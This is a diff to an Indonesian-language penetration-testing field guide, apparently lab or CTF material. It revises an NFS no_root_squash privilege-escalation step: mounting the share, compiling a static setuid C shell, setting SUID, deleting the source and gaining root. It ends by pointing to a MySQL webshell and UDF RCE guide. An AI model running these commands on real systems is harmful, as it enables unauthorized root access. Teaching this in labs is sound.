@@ -2374,17 +2374,34 @@ Bash
 ```
 # Catat share path
 export VULN_SHARE="/opt/dev_share"
+export TARGET="10.49.151.40" # Contoh IP Target
 
-# Di Parrot OS (terminal terpisah):
+# =========================================================
+# DI PARROT OS (Terminal Terpisah):
+# =========================================================
+sudo mkdir -p /mnt/privesc
 sudo mount -t nfs -o nolock $TARGET:$VULN_SHARE /mnt/privesc
-sudo cp /bin/bash /mnt/privesc/rootbash
-sudo chmod +xs /mnt/privesc/rootbash
-ls -la /mnt/privesc/rootbash    # Konfirmasi -rwsr-xr-x
 
-# Kembali ke shell target:
-/opt/dev_share/rootbash -p
-whoami    # → root
+# 1. Buat kode C langsung dari Parrot OS ke folder mount
+sudo sh -c 'echo "#include <unistd.h>\nint main(){setuid(0);setgid(0);execv(\"/bin/bash\", NULL);return 0;}" > /mnt/privesc/exploit.c'
+
+# 2. Kompilasi secara STATIS agar tidak terkena error GLIBC
+sudo gcc /mnt/privesc/exploit.c -o /mnt/privesc/rootbash -static
+
+# 3. Berikan hak akses SUID dan bersihkan file mentahnya
+sudo chmod +xs /mnt/privesc/rootbash
+sudo rm /mnt/privesc/exploit.c
+
+# Konfirmasi file harus berwarna merah dan memiliki tanda 's' (-rwsr-xr-x)
+ls -la /mnt/privesc/rootbash    
+
+# =========================================================
+# KEMBALI KE SHELL TARGET (User biasa):
+# =========================================================
+/opt/dev_share/rootbash
+whoami    # → root! (Tidak perlu flag -p karena sudah di-bypass oleh fungsi setuid di kode C)
 cat /root/root.txt
+
 ```
 
 **OUTPUT BERHASIL ✅ — Root shell via no_root_squash:**
@@ -2623,4 +2640,4 @@ NFS Findings
 
 ---
 
-> **➡️ NEXT:** Setelah NFS selesai, lanjut ke **`[14a. MySQL & MariaDB Exploitation Workflow — Master Field Guide](/docs/mysql)`** untuk eksploitasi database MySQL/MariaDB — root login tanpa password, `LOAD_FILE()` untuk baca file sistem, `INTO OUTFILE` untuk webshell injection, dan UDF untuk RCE penuh.
+> **➡️ NEXT:** Setelah NFS selesai, lanjut ke **[14a. MySQL & MariaDB Exploitation Workflow — Master Field Guide](/docs/mysql)** untuk eksploitasi database MySQL/MariaDB — root login tanpa password, `LOAD_FILE()` untuk baca file sistem, `INTO OUTFILE` untuk webshell injection, dan UDF untuk RCE penuh.
